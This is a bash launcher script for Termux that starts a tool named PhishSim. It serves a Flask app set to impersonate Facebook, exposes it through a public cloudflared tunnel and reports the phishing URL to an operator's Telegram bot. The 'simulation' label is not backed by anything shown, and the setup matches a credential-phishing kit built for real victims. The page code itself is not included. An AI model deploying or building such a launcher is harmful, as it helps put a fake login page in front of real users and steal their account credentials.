#!/data/data/com.termux/files/usr/bin/bash
set -e
cd ~/phishsim
source .venv/bin/activate

termux-wake-lock 2>/dev/null || true

ENV_FILE=~/phishsim/.tg_env
export SITE_NAME=facebook
export PHISHSIM_PW=kali123

# --- نافذة إدخال التوكن و chat_id ---
if [ ! -f "$ENV_FILE" ] || [ ! -s "$ENV_FILE" ]; then
  echo "============================================"
  echo "  First run — enter your Telegram bot data"
  echo "============================================"
  read -r -p "Bot token (looks like 123456:ABC-DEF...): " TG_TOKEN_IN
  read -r -p "Chat ID (e.g. 8938601996 or -100...): " TG_CHAT_ID_IN

  if [ -z "$TG_TOKEN_IN" ] || [ -z "$TG_CHAT_ID_IN" ]; then
    echo "ERROR: token or chat_id is empty. Aborting."
    exit 1
  fi

  printf 'export TG_TOKEN="%s"\nexport TG_CHAT_ID="%s"\n' \
    "$TG_TOKEN_IN" "$TG_CHAT_ID_IN" > "$ENV_FILE"
  chmod 600 "$ENV_FILE"
  echo "Saved to $ENV_FILE (mode 600)"
fi

source "$ENV_FILE"

# --- إشعار اختبار ---
if [ -n "$TG_TOKEN" ] && [ "$TG_TOKEN" != "" ]; then
  curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
    -d "chat_id=${TG_CHAT_ID}" \
    -d "text=PhishSim: token verified OK" \
    -o /tmp/tg_resp.json 2>/dev/null || true
  if grep -q '"ok":true' /tmp/tg_resp.json 2>/dev/null; then
    echo "[✓] Telegram test message delivered"
  else
    echo "[!] Telegram test failed:"
    cat /tmp/tg_resp.json 2>/dev/null
    echo
    echo "Fix token/chat_id in $ENV_FILE and rerun."
    exit 1
  fi
fi

LOG=~/phishsim/phishsim.log
TUNNEL_LOG=~/phishsim/tunnel.log

pkill -f "python app.py" 2>/dev/null || true
pkill -f "cloudflared tunnel" 2>/dev/null || true
sleep 1

setsid nohup python app.py > "$LOG" 2>&1 < /dev/null &
echo $! > ~/phishsim/.flask.pid
sleep 2

setsid nohup cloudflared tunnel --url http://127.0.0.1:5000 --protocol http2 \
    > "$TUNNEL_LOG" 2>&1 < /dev/null &
echo $! > ~/phishsim/.tunnel.pid
sleep 8

URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$TUNNEL_LOG" | head -1)

curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
  -d "chat_id=${TG_CHAT_ID}" \
  -d "text=PhishSim running: ${URL:-http://127.0.0.1:5000}" \
  > /dev/null 2>&1 || true

echo "=== PhishSim running ==="
echo "Local:  http://127.0.0.1:5000"
[ -n "$URL" ] && echo "Public: $URL"
echo "Logs:   $LOG / $TUNNEL_LOG"
echo
echo "To change token/chat_id later: rm $ENV_FILE && rerun"
